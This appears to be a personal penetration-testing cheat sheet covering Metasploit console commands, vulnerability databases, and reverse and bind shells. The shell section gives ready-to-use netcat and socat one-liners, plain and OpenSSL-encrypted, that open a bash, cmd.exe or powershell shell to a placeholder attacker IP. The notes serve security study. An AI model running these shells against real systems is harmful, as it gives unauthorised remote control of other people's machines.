# General

## Commands
* [grep](https://tldr.ostera.io/grep)
* `chmod +x ./<filename>` : Make a file executable
* `wget <link location>`
* `uname` : Print certain system information
* `python3 -m http.server <port>`: Start up a simple local HTTP server
  * `-m`: run library module as a script

## Vulnerability Databases
* [National Vulnerability Database](https://nvd.nist.gov/vuln/full-listing)
* [Exploit-DB](https://www.exploit-db.com/)
* [Rapid7](https://www.rapid7.com/db/)
* [GTFOBins](https://gtfobins.github.io/): Bypass local security restrictions

## Metasploit
* `msfconsole`: The command line interface
* `set <option> <value>`: Set the given option to value
* `history`: See commands typed earlier
* `search <options> <keywords>:<value>`
* `use <module>`
* `info`
* `back`: Leave the context
* `show options`
* `setg`: Set values that will be used for all modules
* `exploit` or `run`
* Ctrl+Z: Make the session into a background task
* Metasploit Database
  * First, start a database
  * `msfdb init`
  * `db_status`: Check the database status
  * `workspace`: List available workspaces
  * `workspace -a/-d <name>`: Add/Delete a workspace
  * `db_nmap`: The nmap results will be stored to the database
  * `hosts` or `services`: List host and service information of the target system
  * `hosts -R`: Once host information is stored in database, use this command to add the value to the RHOSTS parameter

## Reverse Shell and Bind Shell
* [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* Reverse Shell
  * The attacking machine opens a listner and the target machine connects back to it
* Bind Shell
  * The target machine opens a listner and the attacking machine connects to it
* Netcat
  * `nc -lvnp <port>`: Netcat listening on a port
    * `-l`: Be a listener
    * `-v`: Verbose
    * `-n`: Don't resolve host names or use DNS
    * `-p`: Port specification
  * `nc <ip> <port>`
  * `nc -lnvp <port> -e /bin/bash`: A bind shell listener
  * `nc <ip> <port> -e /bin/bash`: Connect to reverse shell
* Netcat Shell Stabilisation
  * Python
    * `python -c 'import pty;pty.spawn("/bin/bash")'`: Spawn a better featured bash shell
    * `export TERM=xterm`: Gives access to term commands such as `clear`
    * Ctrl+Z + `stty raw -echo; fg`: It turns off our own terminal echo (which allows pressing tab, arrow keys, and Ctrl+C), then foreground the shell 
  * `rlwrap nc -lvnp <port>`
* Socat
  * `socat TCP-L:<port> -`: Socat listening on a port
  * `socat TCP:<ip>:<port> EXEC:powershell.exe,pipes`: Connect back to socat listener on Windows
    * pipes forces powershell to use Unix style standard input and output
  * `socat TCP:<ip>:<port> EXEC:"bash -li"`: Connect back to socat listener on Linux
  * `socat TCP-L:<port> EXEC:powershell.exe,pipes`: Bind shell on Windows
  * `socat TCP-L:<port> EXEC:"bash -li"`: Bind shell on Linux
  * `socat TCP:<TARGET-IP>:<TARGET-PORT> -`: Connect to bind shell
  * ```socat TCP-L:<port> FILE:`tty`,raw,echo=0```: A fully stable tty Linux reverse shell
  * `socat TCP:<ip>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`: Special command to connect to the stable reverse shell
  * Encrypted shells
    * `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`: Generate a certificate
    * `cat shell.key shell.crt > shell.pem`: Merge the 2 files into a simple .pem file
    * `socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -`: Reverse shell listener
    * `socat OPENSSL:<ip>:<port>,verify=0 EXEC:/bin/bash`: Connect back to reverse shell
    * `socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`: Bind shell listener
    * `socat OPENSSL:<ip>:<port>,verify=0 -`: Connect to bind shell
